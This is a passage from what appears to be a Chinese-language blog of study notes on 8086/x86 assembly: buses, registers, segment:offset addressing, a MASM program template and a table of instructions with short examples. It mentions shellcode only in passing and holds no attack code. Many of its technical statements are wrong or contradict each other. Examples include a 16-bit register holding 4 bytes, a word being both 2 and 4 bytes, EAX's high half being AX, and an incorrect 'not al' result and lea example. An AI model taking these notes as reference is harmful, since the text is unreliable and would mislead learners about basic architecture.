id="汇编语言的组成"><a href="#汇编语言的组成" class="headerlink" title="汇编语言的组成"></a>汇编语言的组成</h2><p>汇编指令： 机器码的助记符，有对应的机器码<br>伪指令：没有对应的机器码，由编译器执行，计算机并不执行<br>其他符号：+、-、<code>*</code>、/等，由编译器识别，没有对应的机器码</p><h2 id="基础"><a href="#基础" class="headerlink" title="基础"></a>基础</h2><p>CPU:<br>CPU是计算机的核心部件，控制整个计算机的工作。让一个CPU工作 必须向CPU提供指令和数据，指令和数据在存储器中存放（平时说的内存） 磁盘不同内存，磁盘上的数据或程序不读到内存中就无法被CPU使用。</p><p>控制器：控制器控制各种器件进行工作<br>运算器：运算器进行信息处理</p><p>（以16位CPU举例）<br>CPU的总线：</p><ul><li><p>地址总线：用于寻找地址，然后给出内存地址</p><ul><li>地址总线寻址能力的计算公式：2x地址总线数量根=数据总线宽度 </li></ul></li><li><p>数据总线：用于传输数据</p><ul><li>CPU的读写根据总线进行操作<br>8根数据总线一次可以传送一个8位二进制数据 16位数据总线一次可以传送两个8位二进制数据 32位数据总线一次可以传送三个8位二进制数</li></ul></li><li><p>控制总线：用于控制CPU之外的物理设备<br>用于控制CPU之外的物理设备，所谓的内存读写都是由控制线操控并发送 其中一根负责：读信号输出，控制CPU向外传送读信号 另外一根负责：写信号输出，控制CPU向外传送写信号<br>PCIE、PCIEX、PCIEX6之类接口外部设备的数据传输</p></li></ul><p>几位的CPU一次可以传输对应位数的数据 <em> 16位CPU一次性可以处理16位的数据 </em> 寄存器的最大宽度为16位 * CPU和寄存器之间通路是16位    </p><h2 id="寄存器"><a href="#寄存器" class="headerlink" title="寄存器"></a>寄存器</h2><p>寄存器是干啥的：寄存器信息存储<br>不同的CPU、寄存器的数量和结构都不同</p><p>通用寄存器：</p><ul><li>16位CPU：AX、BX、CX、DX</li><li>x86：EAX、EBX、ECX、EDX</li><li>x64：RAX、RBX、RCX、RDX</li></ul><p>寄存器的高低位：<br>示例-&gt;<br>16位：AX 高：AH 低：AL<br>32位：EAX 高：AX 低:AH<br>64位：RAX 高:EAX 低：AX</p><p>高低位的存储:</p><pre><code>mov ah,64H</code></pre><p>此时AX：6400<br>AH:64 AL:00</p><p>兼容性:<br>高位寄存器会兼容低位寄存器，例如一个16位寄存器的由两个 8位寄存器组成，则32位寄存器由一个16位寄存器和一个高8位寄存器组成（EAX由：AX和AH组成）。</p><h3 id="寄存器的大小和计算"><a href="#寄存器的大小和计算" class="headerlink" title="寄存器的大小和计算"></a>寄存器的大小和计算</h3><p>一个16位寄存器只能存放4个字节 一个32位寄存器只能存放8个字节 一个64位寄存器只能存放16个字节<br>传输问题：<br>字单位：word<br>一个字等于两个字节：1 word=2B<br>8位寄存器传输一个字要传输两次，16位寄存器只需要传输一次<br>一个字在16位寄存器中，自然就存在这个寄存器中的高8位寄存器和低8位寄存器</p><p>寄存器的范围:</p><pre><code>16位寄存器的范围：0000~FFFF32位寄存器的范围：00000000~FFFFFFFF64位寄存器的范围：0000000000000000~FFFFFFFFFFFFFFFF</code></pre><p>常见的计算：</p><pre><code>mov eax, 4C0Hmov ebx, 26CHadd eax, ebxmov data,</code></pre><p>结果位：0000072C<br><img src="https://s1.ax1x.com/2020/09/21/wqkGqA.png" alt=""></p><p>如果计算超过最大范围：<br>8位寄存器计算</p><pre><code> MOV AL,96h MOV BH,99h add AL,BH</code></pre><p>结果为：12F,由于8位寄存器只能放两个字节。所以舍弃到前一位字节，最后AL=2F<br>如果计算范围超过寄存器接受最大范围从左往右舍弃，直到可以接受的范围<br><img src="https://s1.ax1x.com/2020/09/21/wqEqgO.png" alt=""></p><h3 id="寄存器分类"><a href="#寄存器分类" class="headerlink" title="寄存器分类"></a>寄存器分类</h3><p>寄存器分为：</p><ul><li>段寄存器</li><li>常用寄存器</li><li>特殊寄存器</li></ul><p>通用寄存器说明:</p><ul><li>AX累加器</li><li>CX循环次数</li><li>DX除法计算存储器</li><li>BX乘法计算存储器</li></ul><p>段寄存器:</p><ul><li><p>CS:IP</p><ul><li>通过CS：IP寻找存放的指令</li><li>CS为段地址，IP为偏移地址</li><li>每次执行一条指令IP+3</li><li>计算物理地址公式： 物理地址=段地址x10（十六进制的10即为十进制的16）+偏移地址</li></ul></li><li><p>DS:IP</p><ul><li>通过DS：IP寻找存放的数据</li><li>DS为段地址，IP为偏移地址</li></ul></li><li><p>SS:SP</p><ul><li>SS：SP放着栈段的内存地址</li><li>SS为段地址，SP为偏移地址</li></ul></li><li><p>DS:SI</p><ul><li>相对基址变址寻址</li></ul></li><li><p>DSI:DI</p><ul><li>相对基址变址寻址</li></ul></li><li><p>ES:IP</p><ul><li>扩展寄存器，附加段寄存器ES：存放当前执行程序中一个辅助数据段的段地址。 段寄存器 偏移地址寄存器</li></ul></li></ul><h2 id="物理地址"><a href="#物理地址" class="headerlink" title="物理地址"></a>物理地址</h2><p>CPU访问内存单元时，要给出内存单元的地址。所以的内存单元构成的存储空间是一个以维的线性空间<br>每一个内存单元在这个空间都有唯一的地址，这个唯一的地址叫物理地址</p><p>CPU通过地址总线收入存储器的，必须是一个内存单元的物理地址</p><p>16寻找物理地址过程如下:<br>1.CPU中的相关部件提供两个对应CPU位数的地址时，一个称为段地址，另一个称为偏移地址<br>2.段地址和偏移地址通过内部总线收送入一个称为地址加法器的部件<br>3.地址加法器将两个地址合成一个物理地址<br>4.地址加法器通过内部总线将物理地址送入输入输出控制电路<br>5.输入输出控制电路将物理地址送上地址总线<br>6.物理地址被地址总线传到存储器</p><h2 id="寻址"><a href="#寻址" class="headerlink" title="寻址"></a>寻址</h2><p>8086CPU寻址如下：<br>8086CPU有20位地址总线，可以传送20位地址，达到1MB寻址能力。8086CPU又是16位结构，<br>在内部一次性处理、传输、暂存的地址都是16位。16位CPU的内部结构来看，如果将地址从内部<br>简单地发出，那么它只能送出16位的地址，寻址能力只有64KB</p><p>只有16位CPU要寻址，原因:16 cpu总线20位最大1mb，但是寄存器是16位的，所以需要段寄存器来寻址，要不然只能访问640kb<br>寻址大小计算公式：2的x次方/1024</p><p>32位找物理地址的方法：<br>32位CPU有32根地址线百，物理地址=<code>2**32=4294967296=4GB</code>,但是在实际应用中，PCI内存范围度占用了大量的地址范围——接近750MB，导致最后系统物理地问址只有3.25GB左右。CPU过渡到32位以后,寻址时就不答用段地址来寻址了,32位寄存器可以访问所有版的4G地址，所以你那个每个段大小的问题是没有意义权的。<br>(这里的**32，代表2的32次方)</p><p>其实32位cpu照样可以使用超过4gb的内存，某种技术</p><h2 id="指令和数据"><a href="#指令和数据" class="headerlink" title="指令和数据"></a>指令和数据</h2><p>指令和数据没有区别，CPU有时候把内容当做指令有时候把内容当做数据 他们都存储在内存或磁盘中。两者都是二进制</p><h2 id="内存和单元"><a href="#内存和单元" class="headerlink" title="内存和单元"></a>内存和单元</h2><p>存储器被划分成若干个存储单元，每个存储单元从0开始编号。例如一个存储器有128个存储单元 编号：0到127</p><h2 id="常见的容量单位"><a href="#常见的容量单位" class="headerlink" title="常见的容量单位"></a>常见的容量单位</h2><p>常见的容量单位： 1KB=1024B 1MB=1024KB 1GB=1024MB 1TB=1024GB 比特：bit 字节：byte 字：word 1byte=8bit 1word=4byte</p><h2 id="内存地址空间"><a href="#内存地址空间" class="headerlink" title="内存地址空间"></a>内存地址空间</h2><p>内存地址分段</p><ul><li>CPU在这段地址空间中读写数据，实际上就是在相对应的物理存储器中读写数据</li><li>每个物理存储器在这个逻辑存储器中占有一个地址段，即一段地址空间 （某段的地址空间代表着不同的物理设备，假设0~7FFFH空间的代表的是内存的，地址8000H~9FFFH代表的是显存的空间）（内存地址空间是根据不同系统的不同规定）</li><li>（在DOS里）比较安全的一个内存段是：0:200~0:300这个内存地址是无任何数据的，相对安全</li></ul><p>所有的物理存储器被看作一个由若干存储单元组成的逻辑存储器</p><p>物理地址：<br>CPU访问内存单元时，要给出内存单元的地址。所以的内存单元构成的存储空间是一个以维的线性空间 每一个内存单元在这个空间都有唯一的地址，这个唯一的地址叫物理地址 CPU通过地址总线收入存储器的，必须是一个内存单元的物理地址</p><h2 id="编写汇编的工具"><a href="#编写汇编的工具" class="headerlink" title="编写汇编的工具"></a>编写汇编的工具</h2><ul><li>Masm for Windows 集成实验环境</li><li>RadASM</li><li>Vs</li></ul><h2 id="常见的汇编格式"><a href="#常见的汇编格式" class="headerlink" title="常见的汇编格式"></a>常见的汇编格式</h2><pre><code class="asm">DATAS SEGMENT    ;此处输入数据段代码  DATAS ENDSSTACKS SEGMENT    ;此处输入堆栈段代码STACKS ENDSCODES SEGMENT    ASSUME CS:CODES,DS:DATAS,SS:STACKSSTART:    MOV AL,96h    MOV BH,99h    add AL,BH    ;此处输入代码段代码    MOV AH,4CH    INT 21HCODES ENDS    END START</code></pre><p>定义一个段</p><pre><code>&lt;name&gt; SEGMENT .....&lt;name&gt; ENDS</code></pre><p>每个编辑器的命名都有所不同，单都大致相同</p><pre><code>DATAS SEGMENT    ;此处输入数据段代码  DATAS ENDSSTACKS SEGMENT    ;此处输入堆栈段代码STACKS ENDSCODES SEGMENT    ASSUME CS:CODES,DS:DATAS,SS:STACKSSTART:    ;汇编指令CODES ENDS    END START</code></pre><h2 id="汇编程序编译"><a href="#汇编程序编译" class="headerlink" title="汇编程序编译"></a>汇编程序编译</h2><p>编译可以直接通过工具自带的编译，直接编译好exe。或者用masm进行编译<br>（工具直接编译好的结果如下）<br><img src="https://s1.ax1x.com/2020/09/21/wqU8yQ.png" alt=""></p><ul><li>obj文件是编译时产生的生文件（交叉引用的文件，又可以称为中间文件）</li><li>lst是链接文件</li><li>exe是最后编译成功产生的文件</li></ul><h2 id="常见的汇编指令"><a href="#常见的汇编指令" class="headerlink" title="常见的汇编指令"></a>常见的汇编指令</h2><table style="border-collapse: collapse; min-width: 100%;"><colgroup><col style="width: 186px;"><col style="width: 312px;"><col style="width: 413px;"></colgroup><tbody><tr><td style="background-color: rgb(253, 123, 57); border: 1px solid rgb(246, 84, 3); width: 186px; padding: 8px;"><div>指令</div></td><td style="background-color: rgb(253, 123, 57); border: 1px solid rgb(246, 84, 3); width: 312px; padding: 8px;"><div>功能</div></td><td style="background-color: rgb(253, 123, 57); border: 1px solid rgb(246, 84, 3); width: 413px; padding: 8px;"><div>例子</div></td></tr><tr><td style="width: 186px; padding: 8px; border: 1px solid;"><div>mov</div></td><td style="width: 312px; padding: 8px; border: 1px solid;"><div>赋值给寄存器</div></td><td style="width: 413px; padding: 8px; border: 1px solid;"><div>mov ax,60 #将ax赋给ax</div></td></tr><tr><td style="width: 186px; padding: 8px; border: 1px solid;"><div>add</div></td><td style="width: 312px; padding: 8px; border: 1px solid;"><div>加法计算</div></td><td style="width: 413px; padding: 8px; border: 1px solid;"><div>add ax,ax #将ax的值加给ax=ax+ax</div></td></tr><tr><td style="width: 186px; padding: 8px; border: 1px solid;"><div>jmp</div></td><td style="width: 312px; padding: 8px; border: 1px solid;"><div>跳转到指定位置</div></td><td style="width: 413px; padding: 8px; border: 1px solid;"><div>jmp 03C82 #跳转到03C82内存地址</div></td></tr><tr><td style="width: 186px; padding: 8px; border: 1px solid;"><div>int</div></td><td style="width: 312px; padding: 8px; border: 1px solid;"><div>用于中断某些东西，例如int 0中断程序返回0。int 3常用于DEBUG程序，触发为3的时候会调用debug服务</div></td><td style="width: 413px; padding: 8px; border: 1px solid;"><div>int 3</div></td></tr><tr><td style="width: 186px; padding: 8px; border: 1px solid;"><div>inc</div></td><td style="width: 312px; padding: 8px; border: 1px solid;"><div>用于将目标操作数+1</div></td><td style="width: 413px; padding: 8px; border: 1px solid;"><div>inc ax</div><div>inc eas</div></td></tr><tr><td style="width: 186px; padding: 8px; border: 1px solid;"><div>sub</div></td><td style="width: 312px; padding: 8px; border: 1px solid;"><span style="font-size: 14px;">不带借位的减法指令</span></td><td style="width: 413px; padding: 8px; border: 1px solid;"><div>sub ax,bx #ax=ax-bx，ax减去bx的值</div></td></tr><tr><td style="width: 186px; padding: 8px; border: 1px solid;"><div>push</div></td><td style="width: 312px; padding: 8px; border: 1px solid;"><div>入栈</div></td><td style="width: 413px; padding: 8px; border: 1px solid;"><div>push AX #将ax入栈</div></td></tr><tr><td style="width: 186px; padding: 8px; border: 1px solid;"><div>pop</div></td><td style="width: 312px; padding: 8px; border: 1px solid;"><div>出栈</div></td><td style="width: 413px; padding: 8px; border: 1px solid;">pop ax #将栈顶的数据出栈到ax</td></tr><tr><td style="width: 186px; padding: 8px; border: 1px solid;"><div>int</div></td><td style="width: 312px; padding: 8px; border: 1px solid;"><div>程序返回</div></td><td style="width: 413px; padding: 8px; border: 1px solid;"><div>int &lt;code&gt;，例如int 21H，从CPU将控制权返回给程序</div></td></tr><tr><td style="width: 186px; padding: 8px; border: 1px solid;"><div>dec</div></td><td style="width: 312px; padding: 8px; border: 1px solid;"><div>减一指令，用于将目标操作数减一</div></td><td style="width: 413px; padding: 8px; border: 1px solid;"><div>dec ax</div></td></tr><tr><td style="width: 186px; padding: 8px; border: 1px solid;"><div>dw</div></td><td style="width: 312px; padding: 8px; border: 1px solid;"><div>定义字型数据</div></td><td style="width: 413px; padding: 8px; border: 1px solid;"><div>dw 4657H,3214H,0123H</div></td></tr><tr><td style="width: 186px; padding: 8px; border: 1px solid;"><div>or</div></td><td style="width: 312px; padding: 8px; border: 1px solid;">或指令</td><td style="width: 413px; padding: 8px; border: 1px solid;"><div>or al,423CH&nbsp;<img src="汇编指令_files/Image.png" type="image/png" data-filename="Image.png"></div><div><img src="汇编指令_files/Image [1].png" type="image/png" data-filename="Image.png"></div></td></tr><tr><td style="width: 186px; padding: 8px; border: 1px solid;"><div>db</div></td><td style="width: 312px; padding: 8px; border: 1px solid;"><div>定义字节型数据</div></td><td style="width: 413px; padding: 8px; border: 1px solid;"><div>db ‘unIX’相当于db 75H</div></td></tr><tr><td style="width: 186px; padding: 8px; border: 1px solid;"><div>ptr</div></td><td style="width: 312px; padding: 8px; border: 1px solid;"><div>类型临时转换，格式：[類型] ptr [寄存器或地址單元] ，指令調用的其他寄存器也要復合類型才行</div></td><td style="width: 413px; padding: 8px; border: 1px solid;"><div>mov word ptr [BX],AX</div></td></tr><tr><td style="width: 186px; padding: 8px; border: 1px solid;"><div>div、idiv（帶符號的除數）</div></td><td style="width: 312px; padding: 8px; border: 1px solid;"><div>除法（需要定义类型）</div></td><td style="width: 413px; padding: 8px; border: 1px solid;"><div>div byte ptr [BX]</div></td></tr><tr><td style="width: 186px; padding: 8px; border: 1px solid;"><div>dd</div></td><td style="width: 312px; padding: 8px; border: 1px solid;"><div>定义double word类型数据</div></td><td style="width: 413px; padding: 8px; border: 1px solid;"><div>dd 1001H</div></td></tr><tr><td style="width: 186px; padding: 8px; border: 1px solid;"><div>dup</div></td><td style="width: 312px; padding: 8px; border: 1px solid;"><div>定义一个范围的值</div></td><td style="width: 413px; padding: 8px; border: 1px solid;"><div>dd 200 dup (0)</div></td></tr><tr><td style="width: 186px; padding: 8px; border: 1px solid;"><div>lea</div></td><td style="width: 312px; padding: 8px; border: 1px solid;"><div>從一個有效地址取值給寄存器，只能是地址取值，不能是寄存器取值</div></td><td style="width: 413px; padding: 8px; border: 1px solid;"><div>mov bx,0002H</div><div>mov ax,4C20H</div><div>mov DS:[BX],4C20H</div><div>lea CX,DS:[BX]</div><div>;CX=4C20H</div></td></tr><tr><td style="width: 186px; padding: 8px; border: 1px solid;"><div>call</div></td><td style="width: 312px; padding: 8px; border: 1px solid;"><div>無條件跳轉到指令處並開始執行和jmp很像</div></td><td style="width: 413px; padding: 8px; border: 1px solid;"><div>mov eax,esp</div><div>call eax #執行eax放的棧地址</div><div><br></div></td></tr><tr><td style="width: 186px; padding: 8px; border: 1px solid;"><div>dec</div></td><td style="width: 312px; padding: 8px; border: 1px solid;">寄存器或值減一</td><td style="width: 413px; padding: 8px; border: 1px solid;"><div>mov eax,4C00178H</div><div>dec eax</div></td></tr><tr><td style="width: 186px; padding: 8px; border: 1px solid;"><div>mul、imul（帶符號的陳數）</div></td><td style="width: 312px; padding: 8px; border: 1px solid;">乘法</td><td style="width: 413px; padding: 8px; border: 1px solid;"><div>mov ax,1234H</div><div>mov bx,2H</div><div>mul bx</div></td></tr><tr><td style="width: 186px; padding: 8px; border: 1px solid;"><div>xor</div></td><td style="width: 312px; padding: 8px; border: 1px solid;">異或運算</td><td style="width: 413px; padding: 8px; border: 1px solid;"><div>mov ax,4C21H</div><div>xor ax,0</div></td></tr><tr><td style="width: 186px; padding: 8px; border: 1px solid;"><div>not</div></td><td style="width: 312px; padding: 8px; border: 1px solid;">翻轉操作數中的所有位</td><td style="width: 413px; padding: 8px; border: 1px solid;"><div>mov ax,2B3CH</div><div>not al ;AX=3C2BH</div></td></tr><tr><td style="width: 186px; padding: 8px; border: 1px solid;"><div>neg</div></td><td style="width: 312px; padding: 8px; border: 1px solid;"><div>求補運算</div></td><td style="width: 413px; padding: 8px; border: 1px solid;"><div>mov ax,2B3CH</div><div>neg ax</div></td></tr><tr><td style="width: 186px; padding: 8px; border: 1px solid;"><div>shl</div></td><td style="width: 312px; padding: 8px; border: 1px solid;"><div>將一個寄存器或內存單元中的數據左移一位</div></td><td style="width: 413px; padding: 8px; border: 1px solid;"><div>mov ax,2B3CH</div><div>shl al,1 ;將al中數據左移一位（1是移幾位）</div></td></tr><tr><td style="width: 186px; padding: 8px; border: 1px solid;"><div>shr</div></td><td style="width: 312px; padding: 8px; border: 1px solid;"><div>將一個寄存器或內存單元中的數據右移一位</div></td><td style="width: 413px; padding: 8px; border: 1px solid;"><div>mov ax,2B3CH</div><div>shr ah,1 ;將al中數據右移一位（1是移幾位）</div></td></tr><tr><td style="width: 186px; padding: 8px; border: 1px solid;"><div>cmp</div></td><td style="width: 312px; padding: 8px; border: 1px solid;"><div>對比指令</div><div>计算 操作对象1 - 操作对象2 但不保存结果，只是根据结果修改相应的标志位</div><div>（p是比较指令,cmp的功能相当于减法指令。它不保存结果，只是影响相应的标志位。其他的指令通过识别这些被影响的标志位来得知比较结果。）</div></td><td style="width: 413px; padding: 8px; border: 1px solid;"><div>；死循環例</div><div>@test:xor ax,ax</div><div>&nbsp;&nbsp;&nbsp;&nbsp;mov ax,100H</div><div>&nbsp;&nbsp;&nbsp;&nbsp;mov bx,50H</div><div>&nbsp;&nbsp;&nbsp;&nbsp;cmp ax,bx</div><div>&nbsp;&nbsp;&nbsp;&nbsp;jne @test ;不等於則跳轉到test標準</div></td></tr><tr><td style="width: 186px; padding: 8px; border: 1px solid;"><div>je</div></td><td style="width: 312px; padding: 8px; border: 1px solid;"><div>相等則跳轉</div></td><td style="width: 413px; padding: 8px; border: 1px solid;"><div>@test:xor ax,ax</div><div>&nbsp;&nbsp;&nbsp;&nbsp;mov ax,100H</div><div>&nbsp;&nbsp;&nbsp;&nbsp;mov bx,50H</div><div>&nbsp;&nbsp;&nbsp;&nbsp;cmp ax,ax</div><div>&nbsp;&nbsp;&nbsp;&nbsp;je @test ;等於則跳轉到test標準</div></td></tr><tr><td style="width: 186px; padding: 8px; border: 1px solid;"><div>jmp</div></td><td style="width: 312px; padding: 8px; border: 1px solid;"><div>無條件跳轉</div></td><td style="width: 413px; padding: 8px; border: 1px solid;"><div>mov ax,100H</div><div>mov word ptr bx,ax</div><div>jmp @test</div><div>mov cx,04H</div><div>@test: mov ax,0H</div></td></tr><tr><td style="width: 186px; padding: 8px; border: 1px solid;"><div>jz</div></td><td style="width: 312px; padding: 8px; border: 1px solid;"><div>為0則跳轉</div></td><td style="width: 413px; padding: 8px; border: 1px solid;"><div>mov ax,0H</div><div>cmp ax,ax</div><div>jz @test</div><div>mov bx,6C43H</div><div>@test: mov ax,6644H</div></td></tr><tr><td style="width: 186px; padding: 8px; border: 1px solid;"><div>jg</div><div>jng #無無符號數字判斷</div></td><td style="width: 312px; padding: 8px; border: 1px solid;">有符號大於則跳轉</td><td style="width: 413px; padding: 8px; border: 1px solid;"><div>&nbsp;&nbsp;&nbsp;&nbsp;mov ax,400H</div><div>&nbsp;&nbsp;&nbsp;&nbsp;mov bx,200H</div><div>&nbsp;&nbsp;&nbsp;&nbsp;cmp ax,bx</div><div>&nbsp;&nbsp;&nbsp;&nbsp;jg @test</div><div>&nbsp;&nbsp;&nbsp;&nbsp;xor ax,ax</div><div>@test:mov bx,600H</div></td></tr><tr><td style="width: 186px; padding: 8px; border: 1px solid;"><div>jl</div><div>jnl #無符號小於則跳轉</div></td><td style="width: 312px; padding: 8px; border: 1px solid;"><div>有符號小於的則跳轉</div></td><td style="width: 413px; padding: 8px; border: 1px solid;"><div>&nbsp; &nbsp; mov ax,400H</div><div>&nbsp;&nbsp;&nbsp;&nbsp;mov bx,200H</div><div>&nbsp;&nbsp;&nbsp;&nbsp;cmp bx,ax</div><div>&nbsp;&nbsp;&nbsp;&nbsp;jl @test</div><div>&nbsp;&nbsp;&nbsp;&nbsp;xor ax,ax</div><div>@test:mov bx,600H</div></td></tr><tr><td style="width: 186px; padding: 8px; border: 1px solid;"><div>loop</div></td><td style="width: 312px; padding: 8px; border: 1px solid;"><div>循环，cx存放循环次数</div></td><td style="width: 413px; padding: 8px; border: 1px solid;"><div>mov ax,3</div><div>mov cx,2 ;循环两次</div><div>s:add ax,ax</div><div>loop s</div></td></tr><tr><td style="width: 186px; padding: 8px; border: 1px solid;"><div>ret</div></td><td style="width: 312px; padding: 8px; border: 1px solid;"><div>用栈中所保存的数据赋值给IP的，(CS:IP)jump 跳转回来（注意：跳转到指定的地址后，跳转后地址的那条指令是不会执行的）</div><div><img src="汇编指令_files/Image [2].png" type="image/png" data-filename="Image.png"></div><div><br></div><div>IP = ss<em>10(16进制的10) + sp （保存的值出栈， 复制给IP）</em></div><div>sp = sp +2</div><div><br></div><div>这写shellcode的时候，找到函数地址用于返回函数地址</div><div><br></div><div>比如栈顶最上面有12345678h的值，那么ret之后。就是把12345678h pop到IP，在x86为EIP</div><div><br></div><div>堆栈</div><div>12345678h</div><div><br></div><div>ret前</div><div>EAX&nbsp;=&nbsp;12345678 EBX&nbsp;=&nbsp;7EFDE000 ECX&nbsp;=&nbsp;00000000 EDX&nbsp;=&nbsp;00F21005 ESI&nbsp;=&nbsp;00000000 EDI&nbsp;=&nbsp;00000000 EIP&nbsp;=&nbsp;00F21018 ESP&nbsp;=&nbsp;002AFC90 EBP&nbsp;=&nbsp;002AFC94 EFL&nbsp;=&nbsp;00000244</div><div><br></div><div>ret后</div><div>EAX&nbsp;=&nbsp;12345678 EBX&nbsp;=&nbsp;7EFDE000 ECX&nbsp;=&nbsp;00000000 EDX&nbsp;=&nbsp;00F21005 ESI&nbsp;=&nbsp;00000000 EDI&nbsp;=&nbsp;00000000 EIP&nbsp;=&nbsp;12345678 ESP&nbsp;=&nbsp;002AFC94 EBP&nbsp;=&nbsp;002AFC94 EFL&nbsp;=&nbsp;00010244</div><div><br></div><div>堆栈</div><div>&lt;空&gt;</div><div><br></div></td><td style="width: 413px; padding: 8px; border: 1px solid;"><div>假设栈顶最后4个字节（8086汇编）将赋给IP，跳转到对应的物理地址往下执行</div><div><img src="汇编指令_files/Image [3].png" type="image/png" data-filename="Image.png"></div><div>&nbsp;&nbsp;&nbsp;&nbsp;MOV AX,264CH</div><div>&nbsp;&nbsp;&nbsp;&nbsp;MOV BX,3682H</div><div>&nbsp;&nbsp;&nbsp;&nbsp;PUSH AX</div><div>&nbsp;&nbsp;&nbsp;&nbsp;PUSH BX</div><div>&nbsp;&nbsp;&nbsp;&nbsp;MOV CX,2</div><div>&nbsp;&nbsp;&nbsp;&nbsp;MOV AX,SS</div><div>&nbsp;&nbsp;&nbsp;&nbsp;MOV DS,AX</div><div>&nbsp;&nbsp;&nbsp;&nbsp;MOV BX,SP</div><div>&nbsp;&nbsp;&nbsp;&nbsp;MOV AX,DS:[BX]</div><div>XH: ADD AX,AX</div><div>&nbsp;&nbsp;&nbsp;&nbsp;LOOP XH</div><div>&nbsp;&nbsp;&nbsp;&nbsp;POP BX</div><div>&nbsp;&nbsp;&nbsp;&nbsp;POP DX</div><div>&nbsp;&nbsp;&nbsp;&nbsp;PUSH AX</div><div>&nbsp;&nbsp;&nbsp;&nbsp;XOR AX,AX</div><div>&nbsp;&nbsp;&nbsp;&nbsp;RET</div><div><br></div><div><img src="汇编指令_files/Image [4].png" type="image/png" data-filename="Image.png"></div></td></tr><tr><td style="width: 186px; padding: 8px; border: 1px solid;"><div>call</div></td><td style="width: 312px; padding: 8px; border: 1px solid;"><div>将当前的IP 或者 CS:IP 压入栈中，跳转到指定位置</div><div><br></div><div>简单描述：</div><div>sp = sp -2</div><div>ss 10(16进制) + sp = ip （将IP的值压栈）</div><div>IP = IP +16位位移&nbsp;&nbsp;（就是jmp了）</div><div><img src="汇编指令_files/Image [5].png" type="image/png" data-filename="Image.png"></div></td><td style="width: 413px; padding: 8px; border: 1px solid;"><div>&nbsp; MOV AX,264CH</div><div>&nbsp; CALL FAN</div><div>&nbsp; &nbsp;MOV BX,142CH</div><div>FAN: MOV AH,4CH</div><div>&nbsp; &nbsp;INT 21H</div><div><br></div><div>搭配RET一起使用：</div><div>&nbsp;&nbsp;&nbsp;&nbsp;MOV AX,264CH</div><div>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;CALL FAN</div><div>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;MOV BX,248CH</div><div>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;JMP T</div><div>&nbsp;&nbsp;&nbsp;&nbsp;;此处输入代码段代码</div><div>FAN: MOV AH,4CH</div><div>&nbsp;&nbsp;&nbsp;&nbsp;MOV AX,0006H</div><div>&nbsp;&nbsp;&nbsp;&nbsp;PUSH AX</div><div>&nbsp;&nbsp;&nbsp;&nbsp;RET ;跳回到MOV BX执行</div><div>T:&nbsp;&nbsp;INT 21H</div><div><img src="汇编指令_files/save.png" type="image/png" data-filename="save.png"></div></td></tr><tr><td style="width: 186px; padding: 8px; border: 1px solid;"><div>movsx</div></td><td style="width: 312px; padding: 8px; border: 1px solid;"><div>符号扩展的意思是,当计算机存储某一个有符号数时,符号位位于该数的第一位,所以，当扩展一个负数的时候需要将扩展的高位全赋为1.对于正数而言，符号扩展和零扩展MOVZX是一样的，将扩展的高位全赋为0</div><div>(X86汇编或以上才有)</div></td><td style="width: 413px; padding: 8px; border: 1px solid;"><div>&nbsp;&nbsp;例子:MOV BL,80H</div><div>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;MOVSX AX,BL</div><div>&nbsp;&nbsp;&nbsp;AX == 0FF80H</div><div>&nbsp;&nbsp;&nbsp;可能初学者奇怪80H不是正数吗?FF怎么来的?看下面，</div><div>&nbsp;&nbsp;&nbsp;80h = 1000 0000 最高位为符号位, 即符号位为1</div><div>&nbsp;&nbsp;&nbsp;则MOVSX AX, BL后, AX = 1111 1111 1000 0000 = FF80h</div><div><img src="汇编指令_files/Image [6].png" type="image/png" data-filename="Image.png"></div><div><br></div><div><img src="汇编指令_files/Image [7].png" type="image/png" data-filename="Image.png"></div></td></tr><tr><td style="width: 186px; padding: 8px; border: 1px solid;"><div>movzx</div></td><td style="width: 312px; padding: 8px; border: 1px solid;"><div>movzx是把高位全部用0填充，被进行赋值操作的寄存器会把得到的值放在地位寄存器，然后高位寄存器全0补充</div><div><br></div><div>(X86汇编或以上才有)</div></td><td style="width: 413px; padding: 8px; border: 1px solid;"><div>mov BX, 12C5H</div><div>movzx EAX,BX</div><div><br></div><div><img src="汇编指令_files/Image [8].png" type="image/png" data-filename="Image.png"></div></td></tr><tr><td style="width: 186px; padding: 8px; border: 1px solid;"><div>pusha</div><div>pushad</div><div>popa</div><div>popad</div></td><td style="width: 312px; padding: 8px; border: 1px solid;"><div>pusha/pushad两条指令都是将通用寄存器进行入栈</div><div>popa/popad两条指令都是将栈段内的数据全部出栈到通用寄存器</div><div>参考链接：<a href="https://blog.csdn.net/u013490896/article/details/50866801?utm_medium=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-1.nonecase&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-1.nonecase" target="_blank" rel="noopener">https://blog.csdn.net/u013490896/article/details/50866801?utm_medium=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-1.nonecase&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-1.nonecase</a></div></td><td style="width: 413px; padding: 8px; border: 1px solid;"><div><img src="汇编指令_files/Image [9].png" type="image/png" data-filename="Image.png"></div><div><img src="汇编指令_files/Image [10].png" type="image/png" data-filename="Image.png"></div><div><img src="汇编指令_files/Image [11].png" type="image/png" data-filename="Image.png"><img src="汇编指令_files/Image [12].png" type="image/png" data-filename="Image.png"></div></td></tr><tr><td style="width: 186px; padding: 8px; border: 1px solid;"><div>bswap</div></td><td style="width: 312px; padding: 8px; border: 1px solid;"><div>寄存器高位和地位数据字节次序变反</div><div>Example：</div><div>EAX=12345678H</div><div>变反后：</div><div>78563412H</div></td><td style="width: 413px; padding: 8px; border: 1px solid;"><div><img src="汇编指令_files/Image [13].png" type="image/png" data-filename="Image.png"></div></td></tr><tr><td style="width: 186px; padding: 8px; border: 1px solid;"><div>lea</div></td><td style="width: 312px; padding: 8px; border: 1px solid;"><div>（x86汇编或以上才有） load effective address, 加载有效地址，可以将有效地址传送到指定的的寄存器。指令形式是从存储器读数据到寄存器, 效果是将存储器的有效地址写入到目的操作数, 简单说, 